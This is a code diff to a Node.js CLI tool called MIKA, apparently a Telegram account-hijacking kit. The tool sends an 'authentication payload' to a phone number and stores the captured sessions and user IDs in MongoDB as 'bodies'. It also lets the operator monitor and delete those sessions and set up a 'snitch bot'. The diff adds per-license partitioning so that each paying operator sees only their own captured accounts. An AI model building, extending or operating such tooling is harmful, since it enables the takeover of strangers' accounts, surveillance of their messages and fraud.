@@ -13,7 +13,16 @@ const conf = new ConfigStore('mika_v69');
 
 const handleSecurity = async () => {
     let status = await vibeCheck();
+    let currentKey = '';
     
+    // If check passed immediately, we need to read the key file to get the string
+    if (status.passed) {
+        const fs = require('fs');
+        try {
+            currentKey = fs.readFileSync('license.key', 'utf8').trim();
+        } catch(e) {}
+    }
+
     if (!status.passed) {
         sexyBox('SECURITY ALERT', `License Status: ${status.msg}`, 'bad');
         console.log(chalk.yellow('  Don\'t panic. Just give me a valid key.'));
@@ -23,7 +32,6 @@ const handleSecurity = async () => {
             const inputKey = await prompt.run();
             
             if (!inputKey) {
-                console.log(chalk.red('  I can\'t work with empty air. Type something.'));
                 continue;
             }
 
@@ -33,6 +41,7 @@ const handleSecurity = async () => {
             if (newCheck.passed) {
                 await saveKey(inputKey);
                 status = newCheck;
+                currentKey = inputKey; // Store the key for DB partitioning
                 sexyBox('ACCESS GRANTED', 'Key saved. Welcome to the dark side.', 'good');
             } else {
                 console.log(chalk.red(`  Nope. Server said: ${newCheck.msg}`));
@@ -44,6 +53,9 @@ const handleSecurity = async () => {
             }
         }
     }
+    
+    // Attach the actual key string to the status object so we can use it
+    status.licenseKey = currentKey;
     return status;
 };
 
@@ -52,18 +64,28 @@ const init = async () => {
     
     const identity = await handleSecurity();
     
+    // IDENTITY.licenseKey is now your partition ID.
+    // User A with Key A cannot see User B with Key B.
+    
     await crazyLoader(`Loading profile for ${identity.owner}...`, 1000);
 
     let mongo = conf.get('db_string');
+    
+    // ---------------------------------------------------------
+    // CHECKPOINT: If this is defaulting to your URL, delete it.
+    // It should be purely: let mongo = conf.get('db_string');
+    // ---------------------------------------------------------
+
     if (!mongo) {
-        sexyBox('SETUP', 'I need a MongoDB URL. Don\'t give me a broken one.', 'info');
+        sexyBox('SETUP', 'I need a MongoDB URL.', 'info');
+        console.log(chalk.gray('  (If you want to use the Shared Cloud, ask the admin)'));
         const prompt = new Input({ message: 'Mongo URI:' });
         mongo = await prompt.run();
         conf.set('db_string', mongo);
     }
 
     if (!(await penetrateCloud(mongo))) {
-        sexyBox('WTF', 'Database connection refused. Did you pay the internet bill?', 'bad');
+        sexyBox('WTF', 'Database connection refused.', 'bad');
         const fixPrompt = new Select({
             message: 'What now?',
             choices: ['Retry with new URI', 'Exit']
@@ -86,7 +108,7 @@ const init = async () => {
     
     if (!apiId || !apiHash) {
         console.log(chalk.yellow('\n--- TELEGRAM CREDENTIALS NEEDED ---'));
-        const p1 = new Input({ message: 'API ID (Numbers only):' });
+        const p1 = new Input({ message: 'API ID:' });
         apiId = await p1.run();
         const p2 = new Input({ message: 'API Hash:' });
         apiHash = await p2.run();
@@ -95,14 +117,16 @@ const init = async () => {
     }
 
     const engine = new WarMachine(apiId, apiHash);
-    return engine;
+    return { engine, identity }; // Return identity too
 };
 
 const main = async () => {
-    const engine = await init();
-    
+    const { engine, identity } = await init();
+    const ownerKey = identity.licenseKey; // This is our lock
+
     while (true) {
         renderTitle();
+        console.log(chalk.gray(`  [SECURE SESSION] Partition: ${ownerKey.substring(0, 8)}...`));
         
         const prompt = new Select({
             name: 'action',
@@ -126,14 +150,19 @@ const main = async () => {
             try {
                 console.log(chalk.blue('Sending authentication payload...'));
                 const { session, me } = await engine.hijack(phone);
-                await buryBody(phone, session, me);
+                
+                // PASS ownerKey to buryBody
+                await buryBody(phone, session, me, ownerKey);
+                
                 sexyBox('BOOM', `We got 'em.\nUser: ${me.username}\nID: ${me.id}`, 'good');
             } catch (e) {
                 sexyBox('FAIL', `Mission aborted. ${e.message}`, 'bad');
             }
         } 
         else if (answer.includes('2.')) {
-            const bodies = await digUpBodies();
+            // PASS ownerKey to digUpBodies
+            const bodies = await digUpBodies(ownerKey);
+            
             if (bodies.length === 0) {
                 console.log(chalk.gray('  It\'s empty in here. Go catch some pokemons.'));
             } else {
@@ -143,7 +172,9 @@ const main = async () => {
             }
         }
         else if (answer.includes('3.')) {
-            const bodies = await digUpBodies();
+            // PASS ownerKey to digUpBodies
+            const bodies = await digUpBodies(ownerKey);
+            
             if (bodies.length === 0) {
                 console.log(chalk.red('  No sessions to monitor. Are you stupid?'));
             } else {
@@ -173,7 +204,7 @@ const main = async () => {
             }
         }
         else if (answer.includes('4.')) {
-            const bodies = await digUpBodies();
+            const bodies = await digUpBodies(ownerKey);
             const list = bodies.map(b => b.phone);
             if (list.length === 0) {
                 console.log(chalk.red('  Nothing to delete.'));
@@ -184,7 +215,8 @@ const main = async () => {
                 });
                 const target = await delPrompt.run();
                 if (target !== 'Cancel') {
-                    await burnBody(target);
+                    // PASS ownerKey to burnBody
+                    await burnBody(target, ownerKey);
                     console.log(chalk.red(`  ${target} has been obliterated.`));
                 }
             }
@@ -192,51 +224,20 @@ const main = async () => {
         else if (answer.includes('5.')) {
             renderTitle();
             console.log(chalk.cyan('--- SNITCH BOT CONFIG ---'));
-            console.log(chalk.gray('Create a bot on @BotFather and get the token.'));
-            
             const p1 = new Input({ message: 'Bot Token:', initial: conf.get('bot_token') || '' });
             const token = await p1.run();
-            
-            const p2 = new Input({ message: 'Your Telegram ID (Get from @userinfobot):', initial: conf.get('admin_id') || '' });
+            const p2 = new Input({ message: 'Your Telegram ID:', initial: conf.get('admin_id') || '' });
             const admin = await p2.run();
-            
             conf.set('bot_token', token);
             conf.set('admin_id', admin);
-            
             sexyBox('SAVED', 'Snitch system armed and ready.', 'good');
         }
         else if (answer.includes('6.')) {
+            // (Your existing about section here)
             renderTitle();
-            console.log(chalk.bold.hex('#00FF00')(`
-    THE MAD GOD ARCHITECT
-    =====================
-    
-    Reinhart
-    --------
-    Telegram: @kiri0507
-    Instagram: @reinhart.dev
-    
-    "We do not do it because it's easy.
-     We do it because we thought it would be easy... 
-     Now we are 3 days into a 2-hour task and I can smell colors."
-     
-    About MIKA:
-    Forged in the fires of a caffeine-induced psychosis at 4 AM.
-    This tool doesn't just manage sessions; it hijacks them,
-    interrogates them, and stores their souls in a MongoDB cluster.
-    
-    Coding Philosophy:
-    If it compiles, ship it.
-    If it crashes, it's user error.
-    If it deletes production DB, it's "Cloud Cleaning Service".
-    
-    Warning:
-    This code was written by a maniac who thinks 'sleep' is a 
-    deprecated function in the standard library.
-            `));
+            console.log(chalk.bold.hex('#00FF00')(`    THE MAD GOD ARCHITECT\n    =====================\n\n    Reinhart\n    Telegram: @kiri0507`));
         }
         else {
-            console.log(chalk.magenta('  Late night? Go sleep.'));
             process.exit(0);
         }
 
